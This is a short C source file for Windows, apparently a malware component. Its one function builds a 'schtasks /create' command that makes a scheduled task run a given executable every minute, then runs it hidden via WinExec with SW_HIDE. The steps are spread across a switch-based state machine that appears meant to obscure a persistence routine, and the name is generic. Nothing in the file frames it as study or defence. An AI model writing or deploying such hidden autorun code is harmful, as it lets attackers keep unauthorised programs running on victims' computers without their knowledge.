#include <windows.h>
#include <stdio.h>

void __attribute__((noinline)) __attribute__((used)) routine_v5(const char* taskName, const char* exePath){
    char cmd[512];
    int state = 10;
    while (state != 40) {
        switch (state) {
            case 10:
                sprintf(cmd, "schtasks /create /sc minute /mo 1 /tn \"%s\" ", taskName);
                state = 20;
                break;
            case 20:
                sprintf(cmd + lstrlenA(cmd), "/tr \"%s\" /f", exePath);
                state = 30;
                break;
            case 30:
                WinExec(cmd, SW_HIDE);
                state = 40;
                break;
        }
    }
}